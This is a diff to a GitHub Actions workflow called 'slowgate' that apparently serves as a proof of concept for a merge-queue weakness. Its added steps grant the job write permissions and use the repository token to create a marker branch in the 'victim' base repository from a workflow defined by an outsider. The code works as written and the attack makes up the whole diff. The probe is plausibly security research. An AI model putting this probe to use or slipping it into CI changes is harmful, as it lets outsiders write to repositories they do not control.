@@ -2,13 +2,30 @@ name: slowgate
 on:
   pull_request:
   merge_group:
+permissions:
+  contents: write
+  statuses: write
+  checks: write
 jobs:
   slowgate:
     runs-on: ubuntu-latest
     steps:
-      - name: fast on pull_request so the PR becomes enqueueable
+      - name: FORK-OUTSIDER provenance marker
+        run: echo "outsider definition in control of this job"
+      - name: OUTSIDER-DECLARED-GRANT probe
+        env:
+          GH_TOKEN: ${{ github.token }}
+          R: ${{ github.repository }}
+        run: |
+          echo "event=${{ github.event_name }} ref=${{ github.ref }} repo=$R"
+          code=$(curl -s -o /tmp/o.json -w '%{http_code}' -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/$R/git/refs \
+            -d "{\"ref\":\"refs/heads/outsider-in-victim-gate-${{ github.run_id }}\",\"sha\":\"${{ github.sha }}\"}")
+          echo "BASE-REPO-WRITE-FROM-VICTIM-GATE=$code"
+      - name: fast on pull_request so the outsider PR stays enqueueable
         if: github.event_name == 'pull_request'
-        run: echo "pr-ok"
-      - name: slow on merge_group so entries sit in the queue and order stays observable
+        run: echo pr-ok
+      - name: hold the queue briefly
         if: github.event_name == 'merge_group'
-        run: sleep 1500
+        run: sleep 150
